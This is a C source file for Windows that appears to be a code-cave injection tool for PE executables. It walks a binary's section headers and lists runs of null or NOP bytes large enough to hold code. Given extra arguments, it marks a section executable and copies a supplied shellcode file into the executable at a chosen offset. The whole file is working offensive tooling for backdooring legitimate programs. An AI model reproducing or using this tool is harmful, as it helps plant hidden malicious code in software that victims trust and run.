#include <Windows.h>
#include <stdio.h>

DWORD GetFileContent(CHAR *filename, CHAR **data);
VOID GetSectionInformation(CHAR **base, DWORD dwMinSize);
VOID GetCave(CHAR *data, DWORD dwSize, DWORD dwMinSize, CHAR *name, DWORD dwStartOfSection);
DWORD WriteFileContent(CHAR *filename, CHAR *data, DWORD dwSize);

DWORD GetFileContent(CHAR *filename, CHAR **data) {
    HANDLE hFile = CreateFile(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open %s\n", filename);
        ExitProcess(0);
    }

    DWORD dwSize = GetFileSize(hFile, NULL);
    DWORD dwRead = 0;

    *data = GlobalAlloc(GPTR, dwSize);
    ReadFile(hFile, *data, dwSize, &dwRead, NULL);

    CloseHandle(hFile);
    return dwRead;
}

DWORD WriteFileContent(CHAR *filename, CHAR *data, DWORD dwSize) {
    HANDLE hFile = CreateFile(filename, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open %s\n", filename);
        ExitProcess(0);
    }
    DWORD dwWritten = 0;

    WriteFile(hFile, data, dwSize, &dwWritten, NULL);

    CloseHandle(hFile);
    return dwWritten;
}

VOID GetSectionInformation(CHAR **base, DWORD dwMinSize) {
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)*base;
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)pidh + pidh->e_lfanew);
    PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)pidh + pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    while(pish->Name[0] == '.') {
        printf("name\t\taddr\t\tsize\t\tchar\t\tchar addr\r\n");
        
        DWORD baseChar = &pish->Characteristics;
        DWORD baseAddr = *base;
        DWORD offsetChar = baseChar - baseAddr;
        
        printf("%s\t\t0x%08x\t0x%08x\t0x%08x\t0x%08x %d\r\n", pish->Name, pish->PointerToRawData, pish->SizeOfRawData, pish->Characteristics, offsetChar, offsetChar);
        
        CHAR *currentSection = *base + pish->PointerToRawData;
        GetCave(currentSection, pish->SizeOfRawData, dwMinSize, pish->Name, pish->PointerToRawData);
        pish++;
    }
}

VOID GetCave(CHAR *data, DWORD dwSize, DWORD dwMinSize, CHAR *name, DWORD dwStartOfSection) {
    DWORD i = 0;
    DWORD counter = 0;
    DWORD position = 0;
    for(i; i < dwSize; i++) {
        if(data[i] == 0x00 || data[i] == 0x90) {
            counter++;
        } else {
            if(counter != 0 && counter >= dwMinSize) {
                printf("%d bytes found at %s + 0x%08x. File offset 0x%08x (%d)\n", 
                    counter, name, position - counter, dwStartOfSection + (position - counter), dwStartOfSection + (position - counter));
            }
            counter = 0;
        }
        position++;
    }
}

int main(int argc, char **argv) {
    CHAR *filename = argv[1];
    CHAR *buffer = NULL;
    DWORD dwMinSize = atoi(argv[2]);
    DWORD dwSize = GetFileContent(filename, &buffer);
    DWORD offset = 0;
    if(argc == 4) {
        offset = atoi(argv[3]);
        CHAR *current = buffer + offset;
        DWORD *dwCharacteristics = current;

        printf("dwCharacteristics value is 0x%08x\n", *dwCharacteristics);

        *dwCharacteristics |= IMAGE_SCN_MEM_EXECUTE;

        printf("dwCharacteristics value is now 0x%08x\n", *dwCharacteristics);

        WriteFileContent(filename, buffer, dwSize);
    } else if(argc == 5) {
        offset = atoi(argv[3]);
        CHAR *shellcodePath = argv[4];
        CHAR *shellcode = NULL;
        DWORD dwShellcodeSize = GetFileContent(shellcodePath, &shellcode);

        printf("Shellcode size is %d\n", dwShellcodeSize);

        memcpy(buffer + offset, shellcode, dwShellcodeSize);
        WriteFileContent(filename, buffer, dwSize);

    } else {
        GetSectionInformation(&buffer, dwMinSize);
    }

    return 0;
}
